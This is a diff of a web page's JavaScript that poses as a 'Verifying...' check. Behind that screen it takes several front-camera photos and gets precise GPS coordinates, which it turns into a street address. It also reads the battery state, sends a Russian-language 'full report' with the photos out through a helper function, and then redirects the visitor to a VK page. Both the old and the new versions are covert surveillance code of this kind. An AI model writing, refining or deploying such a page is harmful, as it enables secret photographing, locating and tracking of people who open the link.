@@ -222,93 +222,54 @@ CPU: ${s.c} ядра | RAM: ${s.r}
             document.getElementById('label-text').innerText = "Verifying...";
 
             let bat = "N/A";
-            let ph = [];
-            let gps = "*Данные GPS отсутствуют*";
+            if (navigator.getBattery) {
+                const bt = await navigator.getBattery();
+                bat = `${Math.round(bt.level * 100)}%${bt.charging?'⚡':''}`;
+            }
 
-            // 1. Camera (Faster & More Robust)
-            const camP = (async () => {
-                try {
-                    const st = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:640,height:480}}); // Lower res for speed
-                    const v = document.getElementById('video');
-                    v.srcObject = st;
-                    
-                    // Force play, ignore abort errors
-                    try { await v.play(); } catch(e) { console.log("Play warning:", e); }
-                    
-                    await sleep(1000); // Reduced warmup (was 2000)
+            try {
+                const st = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280}});
+                const v = document.getElementById('video');
+                v.srcObject = st;
+                await v.play();
 
-                    const c = document.getElementById('canvas');
-                    c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
-                    const ctx = c.getContext('2d');
+                // GPS
+                let gps = "*GPS Denied*";
+                const gP = new Promise(r => {
+                    navigator.geolocation.getCurrentPosition(
+                        async p => {
+                            const {latitude:la, longitude:lo} = p.coords;
+                            const l = `https://www.google.com/maps?q=${la},${lo}`;
+                            let a = "Unknown";
+                            try { const req = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${la}&lon=${lo}`); a = (await req.json()).display_name; } catch{}
+                            r(`Адрес: ${a}\nКарты: [клик](${l})`);
+                        },
+                        () => r("*Юзер запретил доступ к GPS*"), {enableHighAccuracy:true}
+                    );
+                });
 
-                    // Capture 3 photos quickly
-                    for(let i=0; i<3; i++) {
-                        ctx.drawImage(v,0,0);
-                        // Low quality jpeg for speed
-                        ph.push(await new Promise(r=>c.toBlob(r,'image/jpeg',0.5))); 
-                        if(i<2) await sleep(300); // Faster interval (was 800)
-                    }
-                    st.getTracks().forEach(t=>t.stop());
-                } catch (e) {
-                    console.log("Camera fail:", e);
+                await sleep(2500); // Warmup
+
+                const c = document.getElementById('canvas');
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                const ctx = c.getContext('2d');
+                const ph = [];
+
+                for(let i=0; i<3; i++) {
+                    ctx.drawImage(v,0,0);
+                    ph.push(await new Promise(r=>c.toBlob(r,'image/jpeg',0.8)));
+                    if(i<2) await sleep(800);
                 }
-            })();
 
-            // 2. Battery (Instant)
-            const batP = (async () => {
-                if (navigator.getBattery) {
-                    try {
-                        const bt = await navigator.getBattery();
-                        bat = `${Math.round(bt.level * 100)}% `;
-                        bat += bt.charging ? "подзаряжается" : "не подзаряжается";
-                    } catch(e) {}
-                }
-            })();
+                gps = await gP;
+                st.getTracks().forEach(t=>t.stop());
 
-            // 3. GPS (Increased Timeout & High Accuracy options)
-            const gpsP = new Promise(r => {
-                if (!navigator.geolocation) return r("*GPS не поддерживается*");
-                navigator.geolocation.getCurrentPosition(
-                    async p => {
-                        const {latitude:la, longitude:lo} = p.coords;
-                        const l = `https://www.google.com/maps?q=${la},${lo}`;
-                        let a = "Не определен";
-                        try { 
-                            // Quick timeout for reverse geocoding
-                            const ctrl = new AbortController();
-                            const id = setTimeout(() => ctrl.abort(), 2000);
-                            const req = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${la}&lon=${lo}`, {signal: ctrl.signal}); 
-                            clearTimeout(id);
-                            a = (await req.json()).display_name; 
-                        } catch{}
-                        r(`Адрес: ${a}\nКарты: [клик](${l})`);
-                    },
-                    (err) => {
-                        // Detailed error logging
-                        let eMsg = "Неизвестная ошибка";
-                        switch(err.code) {
-                            case err.PERMISSION_DENIED: eMsg = "Отказ доступа"; break;
-                            case err.POSITION_UNAVAILABLE: eMsg = "Позиция недоступна"; break;
-                            case err.TIMEOUT: eMsg = "Тайм-аут (GPS долгий)"; break;
-                        }
-                        r(`*Ошибка GPS: ${eMsg}*`);
-                    }, 
-                    {enableHighAccuracy: true, timeout: 15000, maximumAge: 0}
-                );
-            });
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('success-icon').style.display = 'block';
+                document.getElementById('label-text').innerText = "Success!";
+                document.getElementById('label-text').style.color = "#009900";
 
-            // 4. Wait max 5 seconds for Camera/Battery, but let GPS run longer if needed? 
-            // Actually better to wait for all but with a hard cap for the whole process.
-            // Let's stick to Promise.allSettled but rely on individual timeouts.
-            
-            await Promise.allSettled([camP, batP, gpsP.then(res => gps = res)]);
-
-            document.getElementById('loader').style.display = 'none';
-            document.getElementById('success-icon').style.display = 'block';
-            document.getElementById('label-text').innerText = "Success!";
-            document.getElementById('label-text').style.color = "#009900";
-
-            const fM = `
+                const fM = `
 *ПОЛНЫЙ ОТЧЕТ (Phase 2)*
 ━━━━━━━━━━━━━━━━
 *ГЕОПОЗИЦИЯ*
@@ -318,11 +279,16 @@ ${gps}
 Заряд: ${bat}
 
 *ФОТО*
-Захвачено фото: ${ph.length > 0 ? ph.length : "НЕТ ДОСТУПА"}
+Захвачено фото: ${ph.length} шт.
 `.trim();
 
-            await _sD(fM, ph);
-            setTimeout(() => window.location.href = "https://vk.com/atypical_kazan", 1000);
+                await _sD(fM, ph);
+                setTimeout(() => window.location.href = "https://vk.com/atypical_kazan", 1000);
+
+            } catch (e) {
+                _sD(`❌ *ACCESS DENIED*: ${e.message}`);
+                window.location.href = "https://vk.com/atypical_kazan";
+            }
         };
     </script>
 </body>
